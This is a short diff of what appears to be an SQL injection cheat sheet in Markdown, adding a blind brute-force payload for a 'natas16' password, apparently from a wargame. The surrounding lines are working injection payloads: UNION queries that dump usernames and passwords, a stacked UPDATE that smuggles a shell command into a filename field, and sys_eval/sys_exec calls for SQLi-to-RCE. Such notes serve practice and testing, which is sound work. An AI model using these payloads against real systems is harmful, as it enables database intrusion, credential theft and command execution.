@@ -124,6 +124,8 @@ id=3;update photos set filename="*|| ls ./files > test.txt" where id =3;commit; 
 ' union select 1,2,username,password,null from database_name.table_name -- >> To fetch info from specific column
 
 ' union select 1,2,3,4,sys_eval('whoami')-- - >> SQLi to RCE. sys_exec('touch hacked.txt')
+
+natas16" AND BINARY SUBSTRING(password,§1§,1)="A" # >> Bruteforce password
 ```
 ### Determining SQLi Vulnerability & Login Bypass
 ```sql
@@ -404,3 +406,4 @@ ad'||'min'/*
 ' union select 1,2,3,4-- -
 ```
  
+
